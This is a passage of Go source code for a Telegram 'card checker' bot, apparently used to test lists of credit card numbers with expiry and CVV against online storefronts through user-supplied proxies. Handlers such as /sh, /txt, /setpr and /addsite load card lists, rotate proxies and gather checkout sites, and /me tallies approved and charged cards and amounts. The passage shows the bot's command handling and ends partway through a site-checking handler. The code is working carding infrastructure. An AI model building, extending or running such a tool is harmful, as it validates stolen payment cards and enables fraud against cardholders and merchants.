			allowedByAllowOnly := cfg.AllowOnlyIDs[uid] || cfg.AllowOnlyIDs[chatID]
			groupsOnly := cfg.GroupsOnly
			allowedGroup := cfg.AllowedGroups[chatID]
			cfg.mu.RUnlock()

			if restrictAll {
				return c.Send("🔒 Bot is restricted to admins only.")
			}
			if restricted {
				return c.Send("🚫 You are restricted from using this bot.")
			}
			if allowOnlyActive && !allowedByAllowOnly {
				return c.Send("🔒 Access restricted to allowed users only.")
			}

			// Groups-only mode: allowed groups pass, PM needs per-user allow
			if groupsOnly {
				isGroup := c.Chat().Type == tele.ChatGroup || c.Chat().Type == tele.ChatSuperGroup
				if isGroup {
					if allowedGroup {
						return next(c)
					}
					return c.Send("🔒 This group is not authorized. @MRxHITTER admin to /addgp.")
				}
			}

			// Default: every user must be explicitly allowed
			if !allowedByUser {
				return c.Send("🔒 You are not authorized. Ask admin to /allowuser @MRxHITTER ID.")
			}

			// Check for expired access
			cfg.mu.RLock()
			expiry := cfg.AllowedUsers[uid]
			cfg.mu.RUnlock()
			if expiry > 0 && time.Now().Unix() > expiry {
				// Auto-remove expired user
				cfg.mu.Lock()
				delete(cfg.AllowedUsers, uid)
				cfg.mu.Unlock()
				cfg.Save()
				return c.Send("⏰ Your access has expired. Contact admin.")
			}

			return next(c)
		}
	})

	// /start
	bot.Handle("/start", func(c tele.Context) error {
		return c.Send(formatStartMsg())
	})

	// /sh <cards>
	bot.Handle("/sh", func(c tele.Context) error {
		uid := c.Sender().ID
		if _, running := activeSessions.Load(uid); running {
			return c.Send("⚠️ You already have an active session. Wait for it to finish.")
		}

		ud := um.Get(uid)
		if len(ud.Proxies) == 0 {
			return c.Send("❌ No proxies. Add one with /setpr <proxy>")
		}

		text := strings.TrimSpace(c.Message().Payload)
		if text == "" {
			return c.Send("Usage: /sh card1|mm|yy|cvv\ncard2|mm|yy|cvv\n...")
		}

		cards := parseCardsFromText(text)
		if len(cards) == 0 {
			return c.Send("❌ No valid cards found. Format: number|mm|yy|cvv")
		}

		sess := &CheckSession{
			UserID:       uid,
			Username:     c.Sender().Username,
			Cards:        cards,
			Total:        len(cards),
			StartTime:    time.Now(),
			ShowDecl:     true,
			ShowApproved: true,
			Done:         make(chan struct{}),
		}
		activeSessions.Store(uid, sess)

		proxies := make([]string, len(ud.Proxies))
		copy(proxies, ud.Proxies)

		go runSession(bot, c.Chat(), sess, proxies, um, reduceKey)

		return nil
	})

	// /txt — reply to a .txt file
	bot.Handle("/txt", func(c tele.Context) error {
		uid := c.Sender().ID
		if _, running := activeSessions.Load(uid); running {
			return c.Send("⚠️ You already have an active session. Wait for it to finish.")
		}

		ud := um.Get(uid)
		if len(ud.Proxies) == 0 {
			return c.Send("❌ No proxies. Add one with /setpr <proxy>")
		}

		msg := c.Message()
		var doc *tele.Document
		if msg.Document != nil {
			doc = msg.Document
		} else if msg.ReplyTo != nil && msg.ReplyTo.Document != nil {
			doc = msg.ReplyTo.Document
		}
		if doc == nil {
			return c.Send("❌ Reply to a .txt file with /txt or attach a .txt file with /txt as caption")
		}

		rc, err := bot.File(&doc.File)
		if err != nil {
			return c.Send("❌ Failed to download file: " + err.Error())
		}
		defer rc.Close()
		data, err := io.ReadAll(rc)
		if err != nil {
			return c.Send("❌ Failed to read file: " + err.Error())
		}

		cards := parseCardsFromText(string(data))
		if len(cards) == 0 {
			return c.Send("❌ No valid cards found in file. Format: number|mm|yy|cvv")
		}

		// Store pending data and ask about approved messages
		txtPendingMu.Lock()
		txtPending[uid] = &txtPendingData{
			Cards:    cards,
			ChatID:   c.Chat().ID,
			Username: c.Sender().Username,
		}
		txtPendingMu.Unlock()

		return c.Send(fmt.Sprintf("📋 %d cards loaded.\n\n💬 Show 3DS (approved) in chat?\n\n/yes — show approved\n/no — hide approved"))
	})

	// /yes — start txt session with approved shown
	bot.Handle("/yes", func(c tele.Context) error {
		uid := c.Sender().ID
		txtPendingMu.Lock()
		pd, ok := txtPending[uid]
		if ok {
			delete(txtPending, uid)
		}
		txtPendingMu.Unlock()
		if !ok {
			return c.Send("❌ No pending session. Use /txt first.")
		}
		if _, running := activeSessions.Load(uid); running {
			return c.Send("⚠️ You already have an active session.")
		}
		sess := &CheckSession{
			UserID:       uid,
			Username:     pd.Username,
			Cards:        pd.Cards,
			Total:        len(pd.Cards),
			StartTime:    time.Now(),
			ShowDecl:     false,
			ShowApproved: true,
			Done:         make(chan struct{}),
		}
		activeSessions.Store(uid, sess)
		ud := um.Get(uid)
		proxies := make([]string, len(ud.Proxies))
		copy(proxies, ud.Proxies)
		c.Send(fmt.Sprintf("🚀 Starting check of %d cards (approved: ON)", len(pd.Cards)))
		go runSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, reduceKey)
		return nil
	})

	// /no — start txt session with approved hidden
	bot.Handle("/no", func(c tele.Context) error {
		uid := c.Sender().ID
		txtPendingMu.Lock()
		pd, ok := txtPending[uid]
		if ok {
			delete(txtPending, uid)
		}
		txtPendingMu.Unlock()
		if !ok {
			return c.Send("❌ No pending session. Use /txt first.")
		}
		if _, running := activeSessions.Load(uid); running {
			return c.Send("⚠️ You already have an active session.")
		}
		sess := &CheckSession{
			UserID:       uid,
			Username:     pd.Username,
			Cards:        pd.Cards,
			Total:        len(pd.Cards),
			StartTime:    time.Now(),
			ShowDecl:     false,
			ShowApproved: false,
			Done:         make(chan struct{}),
		}
		activeSessions.Store(uid, sess)
		ud := um.Get(uid)
		proxies := make([]string, len(ud.Proxies))
		copy(proxies, ud.Proxies)
		c.Send(fmt.Sprintf("🚀 Starting check of %d cards (approved: OFF)", len(pd.Cards)))
		go runSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, reduceKey)
		return nil
	})

	// /setpr <proxy> (supports multiple proxies, one per line)
	bot.Handle("/setpr", func(c tele.Context) error {
		// Payload only captures the first line — use full Text instead
		fullText := c.Message().Text
		// Strip the /setpr command (may include @botname)
		idx := strings.Index(fullText, "/setpr")
		if idx >= 0 {
			after := fullText[idx+len("/setpr"):]
			// Strip optional @botname
			if len(after) > 0 && after[0] == '@' {
				if sp := strings.IndexAny(after, " \n"); sp >= 0 {
					after = after[sp:]
				} else {
					after = ""
				}
			}
			fullText = after
		}
		raw := strings.TrimSpace(fullText)
		if raw == "" {
			return c.Send("Usage: /setpr proxy1\\nproxy2\\nproxy3\\n...")
		}

		// Split by newlines to support multiple proxies
		var rawProxies []string
		for _, line := range strings.Split(raw, "\n") {
			line = strings.TrimSpace(line)
			if line != "" {
				rawProxies = append(rawProxies, line)
			}
		}
		if len(rawProxies) == 0 {
			return c.Send("❌ No proxies provided")
		}

		ud := um.Get(c.Sender().ID)

		// Pre-filter: normalize + dedup before testing
		type proxyEntry struct {
			normalized string
			valid      bool
		}
		var toTest []proxyEntry
		dupes := 0
		parseFail := 0
		existing := make(map[string]bool)
		for _, p := range ud.Proxies {
			existing[p] = true
		}
		for _, rp := range rawProxies {
			normalized, err := normalizeProxy(rp)
			if err != nil {
				parseFail++
				continue
			}
			if _, err := url.Parse(normalized); err != nil {
				parseFail++
				continue
			}
			if existing[normalized] {
				dupes++
				continue
			}
			existing[normalized] = true
			toTest = append(toTest, proxyEntry{normalized: normalized})
		}

		if len(toTest) == 0 {
			msg := "❌ No new proxies to test"
			if parseFail > 0 {
				msg += fmt.Sprintf(" (%d invalid)", parseFail)
			}
			if dupes > 0 {
				msg += fmt.Sprintf(" (%d duplicate)", dupes)
			}
			return c.Send(msg)
		}

		c.Send(fmt.Sprintf("🔄 Testing %d proxy(s)...", len(toTest)))

		// Test all proxies concurrently
		var wg sync.WaitGroup
		results := make([]bool, len(toTest))
		for i := range toTest {
			wg.Add(1)
			go func(idx int) {
				defer wg.Done()
				if err := testProxy(toTest[idx].normalized); err == nil {
					results[idx] = true
				}
			}(i)
		}
		wg.Wait()

		added := 0
		failed := 0
		for i, ok := range results {
			if ok {
				ud.Proxies = append(ud.Proxies, toTest[i].normalized)
				added++
			} else {
				failed++
			}
		}
		failed += parseFail

		um.Save()

		msg := fmt.Sprintf("✅ %d proxy(s) added (%d total)", added, len(ud.Proxies))
		if failed > 0 {
			msg += fmt.Sprintf("\n❌ %d failed", failed)
		}
		if dupes > 0 {
			msg += fmt.Sprintf("\n⏭ %d duplicate(s) skipped", dupes)
		}
		return c.Send(msg)
	})

	// /rmpr — user: /rmpr <proxy|all>  admin: /rmpr <user_id> <num> [num2] ...
	bot.Handle("/rmpr", func(c tele.Context) error {
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /rmpr <proxy|all>\nAdmin: /rmpr <user_id> <num> [num2] ...")
		}

		// Admin mode: first arg is numeric user_id, subsequent args are proxy indices
		if isAdmin(c.Sender().ID) {
			parts := strings.Fields(raw)
			if len(parts) >= 2 {
				targetUID, err := strconv.ParseInt(parts[0], 10, 64)
				if err == nil {
					// All remaining parts should be proxy indices
					var indices []int
					allNumeric := true
					for _, p := range parts[1:] {
						idx, err := strconv.Atoi(p)
						if err != nil {
							allNumeric = false
							break
						}
						indices = append(indices, idx)
					}
					if allNumeric && len(indices) > 0 {
						ud := um.Get(targetUID)
						if len(ud.Proxies) == 0 {
							return c.Send(fmt.Sprintf("📝 User %d has no proxies.", targetUID))
						}
						// Sort indices descending to remove from end first
						sort.Sort(sort.Reverse(sort.IntSlice(indices)))
						removed := 0
						for _, idx := range indices {
							i := idx - 1 // 1-based to 0-based
							if i >= 0 && i < len(ud.Proxies) {
								ud.Proxies = append(ud.Proxies[:i], ud.Proxies[i+1:]...)
								removed++
							}
						}
						um.Save()
						return c.Send(fmt.Sprintf("✅ Removed %d proxy(s) from user %d (%d remaining)", removed, targetUID, len(ud.Proxies)))
					}
				}
			}
		}

		// User mode: remove own proxy
		ud := um.Get(c.Sender().ID)
		if strings.ToLower(raw) == "all" {
			ud.Proxies = nil
			um.Save()
			return c.Send("✅ All proxies removed")
		}

		normalized, err := normalizeProxy(raw)
		if err != nil {
			return c.Send("❌ Invalid proxy format: " + err.Error())
		}
		found := false
		newList := make([]string, 0, len(ud.Proxies))
		for _, p := range ud.Proxies {
			if p == normalized {
				found = true
				continue
			}
			newList = append(newList, p)
		}
		if !found {
			return c.Send("❌ Proxy not found in your list")
		}
		ud.Proxies = newList
		um.Save()
		return c.Send(fmt.Sprintf("✅ Proxy removed (%d remaining)", len(ud.Proxies)))
	})

	// /stop — stop own session
	bot.Handle("/stop", func(c tele.Context) error {
		uid := c.Sender().ID
		val, ok := activeSessions.Load(uid)
		if !ok {
			return c.Send("⚠️ No active session to stop.")
		}
		sess := val.(*CheckSession)
		sess.Cancel()
		return c.Send("✅ Your session has been stopped.")
	})

	// /stopall — admin only, stop all sessions
	bot.Handle("/stopall", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("❌ Only admin can use /stopall")
		}
		count := 0
		activeSessions.Range(func(key, val any) bool {
			sess := val.(*CheckSession)
			sess.Cancel()
			count++
			return true
		})
		if count == 0 {
			return c.Send("⚠️ No active sessions.")
		}
		return c.Send(fmt.Sprintf("✅ Stopped %d session(s).", count))
	})

	// /ban <userid> — admin only
	bot.Handle("/ban", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("❌ Only admin can use /ban")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /ban <userid>")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send("❌ Invalid user ID")
		}
		if isAdmin(uid) {
			return c.Send("❌ Cannot ban admin")
		}
		cfg.mu.Lock()
		cfg.BannedUsers[uid] = true
		cfg.mu.Unlock()
		cfg.Save()
		// Also stop their session if running
		if val, ok := activeSessions.Load(uid); ok {
			val.(*CheckSession).Cancel()
		}
		return c.Send(fmt.Sprintf("✅ User %d banned.", uid))
	})

	// /unban <userid> — admin only
	bot.Handle("/unban", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("❌ Only admin can use /unban")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /unban <userid>")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send("❌ Invalid user ID")
		}
		cfg.mu.Lock()
		delete(cfg.BannedUsers, uid)
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("✅ User %d unbanned.", uid))
	})

	// /pvtonly — admin only, toggle private mode
	bot.Handle("/pvtonly", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("❌ Only admin can use /pvtonly")
		}
		cfg.mu.Lock()
		cfg.PvtOnly = !cfg.PvtOnly
		state := cfg.PvtOnly
		cfg.mu.Unlock()
		cfg.Save()
		if state {
			return c.Send("🔒 Private mode ON — only allowed users can use the bot.")
		}
		return c.Send("🔓 Private mode OFF — everyone can use the bot.")
	})

	// /allowuser <userid> [duration] — admin only
	bot.Handle("/allowuser", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("❌ Only admin can use /allowuser")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /allowuser <userid> [duration]\n\nDuration examples:\n• 1h — 1 hour\n• 7d — 7 days\n• 30d — 30 days\n• 1m — 1 month\n• 1y — 1 year\n• permanent — no expiry (default)")
		}
		parts := strings.Fields(raw)
		uid, err := strconv.ParseInt(parts[0], 10, 64)
		if err != nil {
			return c.Send("❌ Invalid user ID")
		}

		var expiryTs int64 // 0 = permanent
		durStr := "permanent"
		if len(parts) >= 2 {
			dur, err := parseDuration(parts[1])
			if err != nil {
				return c.Send("❌ " + err.Error())
			}
			if dur > 0 {
				expiryTs = time.Now().Add(dur).Unix()
				durStr = parts[1]
			}
		}

		cfg.mu.Lock()
		cfg.AllowedUsers[uid] = expiryTs
		cfg.mu.Unlock()
		cfg.Save()

		if expiryTs == 0 {
			return c.Send(fmt.Sprintf("✅ User %d allowed permanently.", uid))
		}
		expiryTime := time.Unix(expiryTs, 0).Format("2006-01-02 15:04:05 UTC")
		return c.Send(fmt.Sprintf("✅ User %d allowed for %s (expires: %s)", uid, durStr, expiryTime))
	})

	// /removeuser <userid> — admin only, remove from allowed list
	bot.Handle("/removeuser", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("❌ Only admin can use /removeuser")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /removeuser <userid>")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send("❌ Invalid user ID")
		}
		cfg.mu.Lock()
		delete(cfg.AllowedUsers, uid)
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("✅ User %d removed from allowed list.", uid))
	})

	// /split <N> — reply to a .txt file, splits it into N parts
	bot.Handle("/split", func(c tele.Context) error {
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: reply to a .txt file with /split <N>")
		}
		n, err := strconv.Atoi(raw)
		if err != nil || n < 2 {
			return c.Send("❌ Provide a number >= 2")
		}

		msg := c.Message()
		var doc *tele.Document
		if msg.Document != nil {
			doc = msg.Document
		} else if msg.ReplyTo != nil && msg.ReplyTo.Document != nil {
			doc = msg.ReplyTo.Document
		}
		if doc == nil {
			return c.Send("❌ Reply to a .txt file with /split <N> or attach a .txt file with /split as caption")
		}

		rc, err := bot.File(&doc.File)
		if err != nil {
			return c.Send("❌ Failed to download file: " + err.Error())
		}
		defer rc.Close()
		data, err := io.ReadAll(rc)
		if err != nil {
			return c.Send("❌ Failed to read file: " + err.Error())
		}

		var lines []string
		for _, line := range strings.Split(string(data), "\n") {
			line = strings.TrimSpace(line)
			if line != "" {
				lines = append(lines, line)
			}
		}
		if len(lines) == 0 {
			return c.Send("❌ File is empty")
		}
		if n > len(lines) {
			n = len(lines)
		}

		chunkSize := len(lines) / n
		extra := len(lines) % n
		start := 0
		for i := 0; i < n; i++ {
			end := start + chunkSize
			if i < extra {
				end++
			}
			chunk := lines[start:end]
			start = end

			buf := bytes.NewBufferString(strings.Join(chunk, "\n"))
			fname := fmt.Sprintf("part_%d_of_%d.txt", i+1, n)
			doc := &tele.Document{
				File:     tele.FromReader(buf),
				FileName: fname,
				Caption:  fmt.Sprintf("📄 Part %d/%d (%d lines)", i+1, n, len(chunk)),
			}
			bot.Send(c.Chat(), doc)
		}
		return nil
	})

	// /addsite — admin only, add custom sites (text or reply to .txt)
	bot.Handle("/addsite", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("❌ Only admin can use /addsite")
		}

		var raw string
		msg := c.Message()

		// Check for attached or replied .txt file
		var doc *tele.Document
		if msg.Document != nil {
			doc = msg.Document
		} else if msg.ReplyTo != nil && msg.ReplyTo.Document != nil {
			doc = msg.ReplyTo.Document
		}
		if doc != nil {
			rc, err := bot.File(&doc.File)
			if err != nil {
				return c.Send("❌ Failed to download file: " + err.Error())
			}
			defer rc.Close()
			data, err := io.ReadAll(rc)
			if err != nil {
				return c.Send("❌ Failed to read file: " + err.Error())
			}
			raw = string(data)
		} else {
			// Get text after /addsite command
			fullText := msg.Text
			idx := strings.Index(fullText, "/addsite")
			if idx >= 0 {
				after := fullText[idx+len("/addsite"):]
				if len(after) > 0 && after[0] == '@' {
					if sp := strings.IndexAny(after, " \n"); sp >= 0 {
						after = after[sp:]
					} else {
						after = ""
					}
				}
				raw = after
			}
		}

		raw = strings.TrimSpace(raw)
		if raw == "" {
			return c.Send("Usage: /addsite site1\nsite2\nsite3\n\nOr reply to a .txt file with /addsite")
		}

		added := 0
		dupes := 0
		customSitesMu.Lock()
		existing := make(map[string]bool, len(customSites))
		for _, s := range customSites {
			existing[s] = true
		}
		for _, line := range strings.Split(raw, "\n") {
			site := strings.TrimSpace(line)
			if site == "" {
				continue
			}
			site = strings.TrimRight(site, "/")
			if !strings.HasPrefix(site, "http") {
				site = "https://" + site
			}
			if existing[site] {
				dupes++
				continue
			}
			customSites = append(customSites, site)
			existing[site] = true
			added++
		}
		total := len(customSites)
		customSitesMu.Unlock()
		saveCustomSites()

		msgText := fmt.Sprintf("✅ Added %d site(s) (%d total custom sites)", added, total)
		if dupes > 0 {
			msgText += fmt.Sprintf("\n⏭ %d duplicate(s) skipped", dupes)
		}
		return c.Send(msgText)
	})

	// /rmsite <site|all> — admin only
	bot.Handle("/rmsite", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("❌ Only admin can use /rmsite")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /rmsite <site> or /rmsite all")
		}
		if strings.ToLower(raw) == "all" {
			customSitesMu.Lock()
			customSites = nil
			customSitesMu.Unlock()
			saveCustomSites()
			return c.Send("✅ All custom sites removed. Bot will use API sites.")
		}
		site := strings.TrimRight(strings.TrimSpace(raw), "/")
		if !strings.HasPrefix(site, "http") {
			site = "https://" + site
		}
		customSitesMu.Lock()
		found := false
		newList := make([]string, 0, len(customSites))
		for _, s := range customSites {
			if s == site {
				found = true
				continue
			}
			newList = append(newList, s)
		}
		customSites = newList
		remaining := len(customSites)
		customSitesMu.Unlock()
		if !found {
			return c.Send("❌ Site not found in custom list")
		}
		saveCustomSites()
		if remaining == 0 {
			return c.Send("✅ Site removed. No custom sites left — bot will use API sites.")
		}
		return c.Send(fmt.Sprintf("✅ Site removed (%d remaining)", remaining))
	})

	// /site <keyword> or /site all — admin only
	bot.Handle("/site", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("❌ Only admin can use /site")
		}
		keyword := strings.TrimSpace(c.Message().Payload)
		if keyword == "" {
			return c.Send("Usage: /site <keyword>  or  /site all")
		}

		// Gather all sites: custom + API pool
		allSites := make(map[string]bool)
		for _, s := range getCustomSites() {
			allSites[s] = true
		}
		sitePoolMu.RLock()
		for _, s := range sitePool {
			allSites[s] = true
		}
		sitePoolMu.RUnlock()

		if strings.ToLower(keyword) == "all" {
			if len(allSites) == 0 {
				return c.Send("📝 No sites available.")
			}
			var list []string
			for s := range allSites {
				list = append(list, s)
			}
			sort.Strings(list)
			buf := bytes.NewBufferString(strings.Join(list, "\n"))
			doc := &tele.Document{
				File:     tele.FromReader(buf),
				FileName: "sites.txt",
				Caption:  fmt.Sprintf("🌐 All sites (%d)", len(list)),
			}
			return c.Send(doc)
		}

		kw := strings.ToLower(keyword)
		var matches []string
		for s := range allSites {
			if strings.Contains(strings.ToLower(s), kw) {
				matches = append(matches, s)
			}
		}
		sort.Strings(matches)

		if len(matches) == 0 {
			return c.Send(fmt.Sprintf("🔍 No sites found containing \"%s\"", keyword))
		}
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("🔍 Sites matching \"%s\" (%d):\n\n", keyword, len(matches)))
		for i, s := range matches {
			sb.WriteString(fmt.Sprintf("%d. %s\n", i+1, s))
		}
		return c.Send(sb.String())
	})

	// /stats — global stats for all users
	bot.Handle("/stats", func(c tele.Context) error {
		return c.Send(formatStatsMsg(um))
	})

	// /active
	bot.Handle("/active", func(c tele.Context) error {
		return c.Send(formatActiveMsg())
	})

	// /admin — list admin commands
	bot.Handle("/admin", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		return c.Send(`━━━━━━━━━━━━━━━━━━━━━━
  🔧 𝗔𝗱𝗺𝗶𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀
━━━━━━━━━━━━━━━━━━━━━━

� Stats & Users:
• /stats — Global stats
• /resetstats — Reset all stats
• /me — Your personal stats
• /active — Active checks
• /site <keyword|all> — Search/list sites
• /ssite — Show custom sites
• /ssite new <url> — Replace all sites
• /ssite add <url> — Add a site
• /ssite clear — Clear custom sites
• /chksite <url> — Test a site
• /chk — Check URLs from .txt file
• /verify — Verify all sites

📢 Broadcast:
• /broadcast <msg> — To all users
• /broadcastuser <id|@user> <msg>
• /broadcastactive <msg>

🚫 Access Control:
• /ban <user_id> — Ban user
• /unban <user_id> — Unban user
• /restrict all — Block non-admins
• /restrict <id>[, ...] — Block users
• /allowonly <id>[, ...] — Allow only
• /unrestrict all — Lift all restrictions
• /unrestrict <id>[, ...] — Unblock
• /pvtonly — Toggle private mode
• /allowuser <id> — Allow PM bypass
• /rmuser <id> — Remove PM bypass
• /users — List bypass users

👤 Admin Management:
• /admins — Show all admins
• /addadmin <id> — Add admin
• /rmadmin <id> — Remove admin
• /giveperm <id> <cmd> — Grant perm

🏷 Group Management:
• /addgp <id>[, ...] — Add group(s)
• /showgp — Show groups config
• /delgp <id>[, ...] — Remove group(s)
• /onlygp — Groups-only mode ON
• /allowall — Groups-only mode OFF

🔧 Proxy Management:
• /show <user_id> — Show user proxies
• /chkpr <user_id> — Check user proxies
• /rmpr <user_id> <num> ... — Remove
• /cleanproxies — Clean all dead proxies

🛑 Controls:
• /stop — Stop your session
• /stopuser <user_id> — Stop a user
• /stopall — Stop all sessions
• /resetactive — Reset all active
• /reboot — Reboot the bot

💳 Price:
• /setprice <url> <amount>
• /addsite <url> — Add custom site
• /rmsite <url|all> — Remove site`)
	})

	// /broadcast — send message to all known users
	bot.Handle("/broadcast", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		fullText := c.Message().Text
		idx := strings.Index(fullText, " ")
		if idx < 0 || strings.TrimSpace(fullText[idx:]) == "" {
			return c.Send("Usage: /broadcast <message>")
		}
		msg := strings.TrimSpace(fullText[idx:])
		ids := um.AllIDs()
		sent, failed := 0, 0
		for _, uid := range ids {
			_, err := bot.Send(tele.ChatID(uid), "📢 "+msg)
			if err != nil {
				failed++
			} else {
				sent++
			}
		}
		return c.Send(fmt.Sprintf("📢 Broadcast complete\n✅ Sent: %d\n❌ Failed: %d", sent, failed))
	})

	// ── /me — personal stats ──
	bot.Handle("/me", func(c tele.Context) error {
		ud := um.Get(c.Sender().ID)
		s := ud.Stats
		approvedRate := 0.0
		chargedRate := 0.0
		if s.TotalChecked > 0 {
			approvedRate = float64(s.TotalApproved) * 100.0 / float64(s.TotalChecked)
			chargedRate = float64(s.TotalCharged) * 100.0 / float64(s.TotalChecked)
		}
		return c.Send(fmt.Sprintf("━━━━━━━━━━━━━━━━━━━━━━\n"+
			"  📊  𝗬𝗼𝘂𝗿 𝗦𝘁𝗮𝘁𝘀\n"+
			"━━━━━━━━━━━━━━━━━━━━━━\n\n"+
			"📋 Checked:  %d\n"+
			"✅ Approved: %d (%.1f%%)\n"+
			"❌ Declined: %d\n"+
			"💳 Charged:  %d (%.1f%%)\n"+
			"💰 Amount:   $%.2f\n"+
			"🌐 Proxies:  %d\n\n"+
			"━━━━━━━━━━━━━━━━━━━━━━",
			s.TotalChecked,
			s.TotalApproved, approvedRate,
			s.TotalDeclined,
			s.TotalCharged, chargedRate,
			s.TotalChargedAmt,
			len(ud.Proxies)))
	})

	// ── /resetstats — admin only ──
	bot.Handle("/resetstats", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		um.mu.Lock()
		for _, ud := range um.users {
			ud.Stats = UserStats{}
		}
		um.mu.Unlock()
		um.Save()
		return c.Send("✅ All user stats have been reset.")
	})

	// ── /ssite — manage custom sites ──
	bot.Handle("/ssite", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		raw := strings.TrimSpace(c.Message().Payload)

		// No args: show current custom sites
		if raw == "" {
			sites := getCustomSites()
			if len(sites) == 0 {
				return c.Send("📝 No custom sites configured. Using API sites.")
			}
			var sb strings.Builder
			sb.WriteString(fmt.Sprintf("🌐 Custom sites (%d):\n\n", len(sites)))
			for i, s := range sites {
				sb.WriteString(fmt.Sprintf("%d. %s\n", i+1, s))
			}
			return c.Send(sb.String())
		}

		parts := strings.SplitN(raw, " ", 2)
		subcmd := strings.ToLower(parts[0])

		switch subcmd {
		case "new":
			if len(parts) < 2 || strings.TrimSpace(parts[1]) == "" {
				return c.Send("Usage: /ssite new <url>")
			}
			site := strings.TrimRight(strings.TrimSpace(parts[1]), "/")
			if !strings.HasPrefix(site, "http") {
				site = "https://" + site
			}
			customSitesMu.Lock()
			customSites = []string{site}
			customSitesMu.Unlock()
			saveCustomSites()
			return c.Send(fmt.Sprintf("✅ All sites replaced with: %s", site))

		case "add":
			if len(parts) < 2 || strings.TrimSpace(parts[1]) == "" {
				return c.Send("Usage: /ssite add <url>")
			}
			site := strings.TrimRight(strings.TrimSpace(parts[1]), "/")
			if !strings.HasPrefix(site, "http") {
				site = "https://" + site
			}
			customSitesMu.Lock()
			for _, s := range customSites {
				if s == site {
					customSitesMu.Unlock()
					return c.Send("⏭ Site already in list")
				}
			}
			customSites = append(customSites, site)
			total := len(customSites)
			customSitesMu.Unlock()
			saveCustomSites()
			return c.Send(fmt.Sprintf("✅ Site added (%d total)", total))

		case "clear":
			customSitesMu.Lock()
			customSites = nil
			customSitesMu.Unlock()
			saveCustomSites()
			return c.Send("✅ All custom sites cleared. Bot will use API sites.")

		default:
			return c.Send("Usage: /ssite [new <url> | add <url> | clear]")
		}
	})

	// ── /chksite <url> — test if a site works ──
	bot.Handle("/chksite", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /chksite <url>")
		}
		site := strings.TrimRight(raw, "/")
		if !strings.HasPrefix(site, "http") {
			site = "https://" + site
		}
		c.Send(fmt.Sprintf("🔄 Testing %s...", site))

		cl := &http.Client{Timeout: 15 * time.Second}
		resp, err := cl.Get(site + "/products.json?limit=1")
		if err != nil {
			return c.Send(fmt.Sprintf("❌ Failed: %v", err))
		}
		defer resp.Body.Close()
		if resp.StatusCode != 200 {
			return c.Send(fmt.Sprintf("❌ HTTP %d from %s", resp.StatusCode, site))
		}
		body, _ := io.ReadAll(resp.Body)
		var pr ProductsResponse
		if json.Unmarshal(body, &pr) != nil {
			return c.Send(fmt.Sprintf("❌ Invalid JSON from %s", site))
		}
		avail := 0
		for _, p := range pr.Products {
			for _, v := range p.Variants {
				if v.Available {
					avail++
				}
			}
		}
		return c.Send(fmt.Sprintf("✅ %s is working\n📦 Products: %d, Available variants: %d", site, len(pr.Products), avail))
	})

	// ── /chk — check URLs from txt file ──
	bot.Handle("/chk", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		msg := c.Message()
		var doc *tele.Document
		if msg.Document != nil {
			doc = msg.Document
		} else if msg.ReplyTo != nil && msg.ReplyTo.Document != nil {
			doc = msg.ReplyTo.Document
		}
		if doc == nil {
			return c.Send("❌ Reply to a .txt file with /chk")
		}
		rc, err := bot.File(&doc.File)
		if err != nil {
			return c.Send("❌ Failed to download file: " + err.Error())
		}
		defer rc.Close()
		data, _ := io.ReadAll(rc)

		var urls []string
		for _, line := range strings.Split(string(data), "\n") {
			line = strings.TrimSpace(line)
			if line != "" {
				if !strings.HasPrefix(line, "http") {
					line = "https://" + line
				}
				urls = append(urls, strings.TrimRight(line, "/"))
			}
		}
		if len(urls) == 0 {
			return c.Send("❌ No URLs found in file")
		}

		c.Send(fmt.Sprintf("🔄 Checking %d site(s)...", len(urls)))

		var working, failed []string
		cl := &http.Client{Timeout: 10 * time.Second}
		for _, u := range urls {
			resp, err := cl.Get(u + "/products.json?limit=1")
			if err != nil {
				failed = append(failed, u)
				continue
			}
			resp.Body.Close()
			if resp.StatusCode == 200 {
				working = append(working, u)
			} else {
				failed = append(failed, u)
			}
		}

